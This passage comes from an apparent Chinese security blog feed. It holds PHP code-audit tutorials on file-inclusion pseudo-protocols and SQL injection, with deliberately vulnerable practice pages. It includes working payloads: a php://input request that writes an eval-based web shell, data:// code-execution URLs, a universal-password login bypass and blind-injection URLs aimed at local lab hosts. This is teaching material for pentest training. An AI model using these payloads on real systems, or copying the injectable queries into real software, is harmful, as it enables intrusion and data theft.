<code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><p><strong>php://filter参数详解</strong></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（*\     *）分隔。</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（\     ）分隔。</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p><strong>可用的过滤器列表（4类）</strong><br>|字符串过滤器| 作用 |<br>|–|–|<br>| string.rot13 |  等同于<code>str_rot13()，rot13</code>变换|<br>| string.toupper |等同于<code>strtoupper()</code>，转大写字母  |<br>| string.tolower | 等同于<code>strtolower()</code>，转小写字母 |<br>| string.strip_tags | 等同于<code>strip_tags()</code>，去除html、PHP语言标签 |</p><table><thead><tr><th>转换过滤器</th><th>作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><table><thead><tr><th>加密过滤器</th><th>作用</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table><p>例子：</p><ol><li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//1.1.1.137:8001/protocol/file.php?file=php://filter/read=convert.base64-encode/resource=./1.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201209223019605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p><code>php://input + [POST DATA]</code>执行php代码</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//1.1.1.137:8001/protocol/file.php?file=php://input</span><span class="token punctuation">[</span><span class="token constant">POST</span> <span class="token constant">DATA</span>部分<span class="token punctuation">]</span><span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201209223746974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如果有写入权限，也可以直接写一句话：</p></li></ol><pre><code>```phphttp://127.0.0.1/include.php?file=php://input[POST DATA部分]&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;```![在这里插入图片描述](https://img-blog.csdnimg.cn/20201209224127760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70)</code></pre><h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a>data:// 协议</h3><p>条件：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code>:on</li></ul><p>作用：</p><ul><li>自PHP<code>&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</li></ul><p>例子：</p><ol><li><p><code>data://text/plain,</code></p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//1.1.1.137:8001/protocol/file.php?file=data://text/plain,&lt;?php%20phpinfo();?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020120923045055.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p><code>data://text/plain;base64,</code></p></li></ol><pre><code>```phphttp://1.1.1.137:8001/protocol/file.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b```![在这里插入图片描述](https://img-blog.csdnimg.cn/20201209231127579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70)</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础：SQL注入漏洞</title>
      <link href="/posts/d2d692cc.html"/>
      <url>/posts/d2d692cc.html</url>
      
        <content type="html"><![CDATA[<h3 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a>SQL注入介绍</h3><blockquote><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p></blockquote><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">database</span> admin<span class="token punctuation">;</span><span class="token keyword">use</span> admin<span class="token punctuation">;</span><span class="token keyword">create</span> <span class="token keyword">table</span> <span class="token keyword">user</span> <span class="token punctuation">(</span>    ID <span class="token keyword">int</span> <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">,</span>     username <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    password <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> <span class="token keyword">into</span> <span class="token keyword">user</span><span class="token punctuation">(</span>ID<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">123456</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'root'</span><span class="token punctuation">,</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'guest'</span><span class="token punctuation">,</span><span class="token string">'666666'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="编写注入页面"><a href="#编写注入页面" class="headerlink" title="编写注入页面"></a>编写注入页面</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 连接数据库</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"数据库连接失败！"</span><span class="token punctuation">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 构造SQL语句</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM user WHERE id=$id"</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 执行SQL语句</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 循环输出返回值</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"ID: "</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'ID'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"username: "</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"password: "</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 关闭连接</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 打印SQL语句</span><span class="token keyword">echo</span> <span class="token string">'&lt;hr>'</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">.</span><span class="token variable">$sql</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201124143103763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="数字型注入与字符型注入的区别"><a href="#数字型注入与字符型注入的区别" class="headerlink" title="数字型注入与字符型注入的区别"></a>数字型注入与字符型注入的区别</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>我们上面构造的注入页面就是一个数字型的注入页面，变量id拼接在SQL语句中，没有单引号的保护，就容易造成SQL注入。</p><p>payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>    <span class="token shell-comment comment"># 正常</span><span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token shell-comment comment"># 不正常</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201124143715417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h4><p>我们把上面构造的注入页面中的变量sql改一下，就变成字符型注入了：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM user WHERE id='$id'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里即使加上了单引号的保护，我们只要把他的单引号闭合一下就依然可以注入</p><p>payload:</p><pre class="line-numbers language-sq"><code class="language-sq"># 正常?id=3' and 1=1--+# 报错?id=1' and 1=2--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201124145307547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>所以，字符型注入与数字型注入的<strong>根本区别</strong>在于，<strong>需不需要进行单引号闭合</strong>。</p><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><h4 id="编写登录页面"><a href="#编写登录页面" class="headerlink" title="编写登录页面"></a>编写登录页面</h4><p>这里简单写了一个登陆页面，有POST注入跟万能密码登录</p><p>login.html：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>后台登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    账号：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>登录<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>login.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 判断是否进行了POST传值</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"数据不能为空！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token shell-comment comment"># 接受的变量赋值给username与password</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 连接数据库</span>    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"数据库连接失败！"</span><span class="token punctuation">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 构造SQL语句</span>    <span class="token shell-comment comment"># 万能密码‘or</span><span class="token string">'='</span><span class="token keyword">or</span>‘绕过登录验证    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM USER WHERE USERNAME='$username' AND PASSWORD='$password'"</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 输出SQL语句，方便学习</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 执行SQL语句并把结果集返回到$result中</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 把$result中的mun_rows属性值返回给$row_cnt</span>    <span class="token variable">$row_cnt</span>  <span class="token operator">=</span>  <span class="token function">mysqli_num_rows</span> <span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 如果值为零</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row_cnt</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token shell-comment comment"># 打印失败</span>        <span class="token keyword">echo</span> <span class="token string">'登录失败！'</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 或者$row_cnt的值为1</span>    <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$row_cnt</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token shell-comment comment"># 把$result的结果返回给$row</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 打印欢迎xx登陆系统，xxx为数组row中name的值</span>        <span class="token keyword">echo</span> <span class="token string">'欢迎'</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'登录系统！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><p>原理就是我们在审计的时候看一下它的SQL语句是怎么闭合的，有没有做转义，去进行一个绕过。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token shell-comment comment"># 万能密码</span>‘<span class="token keyword">or</span><span class="token string">'='</span><span class="token keyword">or</span>‘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="POST注入-1"><a href="#POST注入-1" class="headerlink" title="POST注入"></a>POST注入</h4><p>这里不手工了，直接burp抓个包sqlmap跑一下吧！</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201125095518564.png#pic_center" alt="在这里插入图片描述"><br>抓包：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201125101441366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>跑一下：</p><pre class="line-numbers language-php"><code class="language-php">Sqlmap <span class="token operator">-</span>r C<span class="token punctuation">:</span>\<span class="token package">Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>1</span><span class="token punctuation">.</span>txt <span class="token operator">--</span>batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201125101631740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201125102021512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注最大的特点就是注入返回的数据不会在页面上进行显示</p><p>这里我就借花献佛，用sql-libs的第八关来演示一下吧</p><p>关键代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>          <span class="token keyword">echo</span> <span class="token string">'You are in...........'</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token keyword">else</span>     <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//echo 'You are in...........';</span>    <span class="token comment" spellcheck="true">//print_r(mysql_error());</span>    <span class="token comment" spellcheck="true">//echo "You have an error in your SQL syntax";</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;/br>&lt;/font>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#0000ff" font size= 3>'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正确的时候显示的you are in…. 错误的时候就是什么都显示</p><p>猜数据库名第一个字母具体过程，使用二分法</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/sql1/Less-8/?id=1%27%20and%20if(ascii(substr((select%20database()),1,1))%3E96,1,0)%20%23</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/sql1/Less-8/?id=1%27%20and%20if(ascii(substr((select%20database()),1,1))%3E110,1,0)%20%23</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/sql1/Less-8/?id=1%27%20and%20if(ascii(substr((select%20database()),1,1))%3E120,1,0)%20%23</span>http<span class="token punctuation">:</span><span class="token comment" 